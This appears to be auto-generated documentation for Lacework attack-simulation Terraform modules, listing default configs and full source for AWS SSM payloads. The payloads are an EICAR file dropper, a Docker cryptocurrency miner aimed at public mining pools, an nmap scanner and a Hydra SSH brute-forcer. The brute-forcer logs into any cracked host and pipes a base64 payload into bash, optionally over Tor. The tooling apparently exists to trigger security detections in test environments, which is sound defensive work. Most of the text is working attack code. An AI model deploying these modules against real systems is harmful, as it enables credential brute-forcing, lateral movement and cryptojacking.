| target-ssm-drop-malware-eicar                                              | ./modules/ssm/drop-malware-eicar                               | ssm_deploy_malware_eicar                   | context.aws.ssm.target.drop.malware.eicar                                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "drop": {<br/>                        "malware": {<br/>                            "eicar": {<br/>                                "eicar_path": "/tmp/eicar",<br/>                                "enabled": false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                               | <pre>locals \{<br/>    eicar\_string\_base64 = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="<br/>    eicar\_path = var\.inputs\["eicar\_path"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script"<br/>        log "creating eicar file: $\{local\.eicar\_path\}\-$\(hostname\)"<br/>        rm \-rf $\{local\.eicar\_path\}\*<br/>        echo \-n '$\{base64decode\(local\.eicar\_string\_base64\)\}' > $\{local\.eicar\_path\}\-$\(hostname\)<br/>        log "$\(ls \-l $\{local\.eicar\_path\}\-$\(hostname\)\)"<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssm-execute-docker-cpu-miner                                        | ./modules/ssm/execute-docker-cpu-miner                         | ssm_exec_docker_cpuminer                   | context.aws.ssm.target.execute.docker_cpu_miner                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_cpu_miner": {<br/>                            "enabled": false,<br/>                            "minergate_image": "mkell43/minerd",<br/>                            "minergate_name": "minerd",<br/>                            "minergate_server": "stratum+tcp://eth.pool.minergate.com:45791",<br/>                            "minergate_user": null,<br/>                            "nicehash_image": "a2ncer/nheqminer_cpu:latest",<br/>                            "nicehash_name": "nicehash",<br/>                            "nicehash_server": "equihash.usa.nicehash.com:3357",<br/>                            "nicehash_user": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner                         | <pre>locals \{<br/>    \# nicehash\_name = var\.inputs\["nicehash\_name"\]<br/>    \# nicehash\_image = var\.inputs\["nicehash\_image"\]<br/>    \# nicehash\_server = var\.inputs\["nicehash\_server"\]<br/>    \# nicehash\_user = var\.inputs\["nicehash\_user"\]<br/>    minergate\_name = var\.inputs\["minergate\_name"\]<br/>    minergate\_image = var\.inputs\["minergate\_image"\]<br/>    minergate\_server = var\.inputs\["minergate\_server"\]<br/>    minergate\_user=var\.inputs\["minergate\_user"\]<br/><br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script"<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.minergate\_name\}\` \]\]; then docker stop $\{local\.minergate\_name\}; fi<br/>        sudo docker run \-\-rm \-d \-\-network=host \-\-name $\{local\.minergate\_name\} $\{local\.minergate\_image\} \-a cryptonight \-o $\{local\.minergate\_server\} \-u $\{ local\.minergate\_user \} \-p x<br/>        sudo docker ps \-a >> $LOGFILE 2>&1<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-ssm-execute-docker-hydra                                            | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_target               | context.aws.ssm.target.execute.docker_hydra                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals \{<br/>    attack\_dir = "/hydra"<br/>    targets = flatten\(\[ for target in var\.inputs\["targets"\]: can\(split\("/", target\)\[1\]\) ? <br/>        \[ for host\_number in range\(pow\(2, 32 \- split\("/", target\)\[1\]\)\) : cidrhost\(target, host\_number\) \]<br/>        :<br/>        \[ target \]<br/>    \]\)<br/>    base64\_command\_payload = var\.inputs\["payload"\]<br/>    payload = <<\-EOT<br/>    \# Function to convert IP address to decimal<br/>    ip\_to\_dec\(\) \{<br/>        local IFS=\.<br/>        read ip1 ip2 ip3 ip4 <<< "$1"<br/>        echo "$\(\(ip1 \* 16777216 \+ ip2 \* 65536 \+ ip3 \* 256 \+ ip4\)\)"<br/>    \}<br/><br/>    \# Function to convert decimal to IP address<br/>    dec\_to\_ip\(\) \{<br/>        local ip dec=$1<br/>        for e in \{3\.\.0\}; do<br/>            \(\(octet = dec / \(256 \*\* e\) \)\)<br/>            \(\(dec \-= octet \* 256 \*\* e\)\)<br/>            ip\+="$$\{octet\}\."<br/>        done<br/>        echo "$$\{ip%?\}"<br/>    \}<br/><br/>    \# Main function to generate IP list from CIDR<br/>    generate\_ips\(\) \{<br/>        local cidr="$1"<br/>        local ip="$$\{cidr%/\*\}"<br/>        local prefix="$$\{cidr\#\*/\}"<br/>        local netmask=$\(\(0xffffffff ^ \(\(1 << \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        local start=$\(ip\_to\_dec "$ip"\)<br/>        local start=$\(\(start & netmask\)\)<br/>        local end=$\(\(start \| \(\(1 << \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        for \(\(ip= start; ip <= end; ip\+\+\)\); do<br/>            dec\_to\_ip "$ip"<br/>        done<br/>    \}<br/><br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk '/scope global/ \{print $4\}' \| head \-1\)<br/>        log "LOCAL\_NET: $LOCAL\_NET"<br/>        log "Targets: $\{join\(",", local\.targets\)\}"<br/>        echo "$\{ length\(local\.targets\) > 0 ? join\("\\n", local\.targets\) : "$\(generate\_ips $LOCAL\_NET\)" \}" > /tmp/hydra\-targets\.txt<br/>        cat > /tmp/hydra\-users\.txt <<'EOF'<br/>    $\{try\(length\(var\.inputs\["ssh\_user"\]\.username\),"false"\) \!= "false" ? var\.inputs\["ssh\_user"\]\.username : "root" \}<br/>    EOF<br/>        cat > /tmp/hydra\-passwords\.txt <<'EOF'<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $\{try\(length\(var\.inputs\["ssh\_user"\]\.password\),"false"\) \!= "false" ? var\.inputs\["ssh\_user"\]\.password : "" \}<br/>    EOF<br/>        if sudo docker ps \-a \| grep $\{var\.inputs\["container\_name"\]\}; then <br/>        sudo docker stop $\{var\.inputs\["container\_name"\]\}<br/>        sudo docker rm $\{var\.inputs\["container\_name"\]\}<br/>        fi<br/>        truncate \-s 0 /tmp/hydra\-found\.txt<br/>        $\{ var\.inputs\["use\_tor"\] == true ? <<\-EOF<br/>        log "Using tor network\.\.\."<br/>        if \! docker ps \| grep torproxy > /dev/null; then<br/>        sudo docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f '\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}' torproxy\)<br/>        log "Running: proxychains hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        log "Running: proxychains hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        : <<\-EOF<br/>        log "Running: hydra \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-V \-L $\{var\.inputs\["user\_list"\]\} \-P $\{var\.inputs\["password\_list"\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        log "Running: hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh"<br/>        sudo /bin/bash \-c "docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true"<br/>        sudo /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        sudo /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        \}<br/>        \# Read Hydra output file line by line<br/>        while IFS= read \-r line; do<br/>            \# Parse Hydra output<br/>            host=$\(echo "$line" \| awk '\{print $3\}'\)<br/>            username=$\(echo "$line" \| awk '\{print $5\}'\)<br/>            password=$\(echo "$line" \| awk '\{print $7\}'\)<br/>            log "Attempting to execute payload: sshpass \-p \\"$password\\" ssh \-o StrictHostKeyChecking=no \\"$username\\"@\\"$host\\" 'echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash"<br/>            sshpass \-p "$password" ssh \-o StrictHostKeyChecking=no "$username"@"$host" 'echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash'<br/>            log "Done"<br/>        done < <\(grep \-v "^\#" /tmp/hydra\-found\.txt \| sort \| uniq\)<br/>        log "Done\."<br/><br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = "sshpass jq"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = "sshpass jq"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| target-ssm-execute-docker-nmap                                             | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_target                | context.aws.ssm.target.execute.docker_nmap                                | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals \{<br/>    attack\_dir = "/nmap"<br/>    attack\_script = "nmap\.sh"<br/>    start\_script = "delayed\_start\.sh"<br/>    lock\_file = "/tmp/delay\_nmap\.lock"<br/>    payload = <<\-EOT<br/>    log "cleaning app directory"<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting script\.\.\."<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk '/scope global/ \{print $4\}' \| head \-1\)<br/>        log "LOCAL\_NET: $LOCAL\_NET"<br/>        log "Targets: $\{join\(",", var\.inputs\["targets"\]\)\}"<br/>        echo "$\{ length\(var\.inputs\["targets"\]\) > 0 ? join\("\\n", var\.inputs\["targets"\]\) : "$LOCAL\_NET" \}" > /tmp/nmap\-targets\.txt<br/>        log "Ports: $\{join\(",", var\.inputs\["ports"\]\)\}"<br/>        if docker ps \-a \| grep $\{var\.inputs\["container\_name"\]\}; then <br/>            docker stop $\{var\.inputs\["container\_name"\]\}<br/>            docker rm $\{var\.inputs\["container\_name"\]\}<br/>        fi<br/>        $\{ var\.inputs\["use\_tor"\] == true ? <<\-EOF<br/>        log "Using tor network\.\.\."<br/>        if \! docker ps \| grep torproxy > /dev/null; then<br/>        docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f '\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}' torproxy\)<br/>        log "Running via docker: proxychains nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt"<br/>        /bin/bash \-c "docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true" <br/>        /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        : <<\-EOF<br/>        log "Running via docker: nmap \-Pn \-sS \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt"<br/>        /bin/bash \-c "docker run \-\-rm \-v /tmp:/tmp \-\-entrypoint=nmap \-\-name $\{var\.inputs\["container\_name"\]\} $\{var\.inputs\["image"\]\} \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(",", var\.inputs\["ports"\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true"<br/>        /bin/bash \-c "docker logs $\{var\.inputs\["container\_name"\]\} >> $LOGFILE 2>&1"<br/>        /bin/bash \-c "docker rm $\{var\.inputs\["container\_name"\]\}"<br/>        EOF<br/>        \}<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>            log "waiting $\{var\.inputs\["attack\_delay"\]\} seconds\.\.\.";<br/>            sleep $\{var\.inputs\["attack\_delay"\]\}<br/>        fi<br/>    done<br/>    log "Done\."<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  <<\-EOT<br/>        log "Checking for docker\.\.\."<br/>        while \! command \-v docker > /dev/null \|\| \! docker ps > /dev/null; do<br/>            log "docker not found or not ready \- waiting"<br/>            sleep 120<br/>        done<br/>        log "docker path: $\(command \-v  docker\)"<br/>        EOT<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = var\.inputs\["attack\_delay"\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
